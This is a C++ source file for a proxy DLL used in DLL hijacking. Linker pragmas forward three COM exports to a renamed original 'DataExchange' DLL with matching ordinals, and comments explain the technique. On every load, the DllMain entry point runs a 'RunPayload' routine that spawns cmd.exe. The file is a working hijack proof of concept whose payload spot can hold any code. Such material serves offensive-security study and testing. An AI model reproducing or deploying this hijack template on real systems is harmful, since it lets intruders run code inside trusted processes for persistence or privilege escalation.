// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <stdio.h>

// Make our DLL export the same funcs, forwarding to the real one.
// Keep ordinals EXACT.
// Syntax: /export:Name=RealDll.Name,@Ordinal
/*
 The linker creates my DLL’s export table from these directives.

The /export: syntax (every piece matters)
Name — the symbol of my DLL exposes to callers (must match the original export name).

=realDll.Name — forwarder: my DLL’s export sends calls to realDll.Name (no code needed).

@Ordinal — ordinal to expose (must match the original DLL’s ordinal).

If i omit =realDll.Name, you are saying “this export is implemented in my DLL,” 
so i must provide a function with that name and calling convention.

 Why ordinals? Many Windows binaries (and some COM consumers) import by ordinal. Break the ordinal, break the process.
*/
#pragma comment(linker, "/export:DllCanUnloadNow=DataExchange.DllCanUnloadNow,@1")
#pragma comment(linker, "/export:DllGetActivationFactory=DataExchange.DllGetActivationFactory,@2")
#pragma comment(linker, "/export:DllGetClassObject=DataExchange.DllGetClassObject,@3")

HANDLE hEvent = 0;
const char* exe = "C:\\Windows\\System32\\cmd.exe";

BOOL IsOtherInstanceRunning() {
    //hEvent = CreateEvent(NULL, TRUE, FALSE, L"event-test-kkkkkkkk");
    //
    //if (GetLastError() == ERROR_ALREADY_EXISTS) {
    //    return TRUE;
    //}

    //return hEvent != NULL;
    
    return false;
}


BOOL RunPayload() {
    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    ZeroMemory(&processInfo, sizeof(processInfo));

    startupInfo.cb = sizeof(startupInfo);

    if (!CreateProcessA(NULL, (LPSTR)exe, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
        return false;
    }

    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);

    return true;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if (IsOtherInstanceRunning()) {
        printf("[!] Other instance already running. aborting...");
        return 0;
   }


    RunPayload();
}

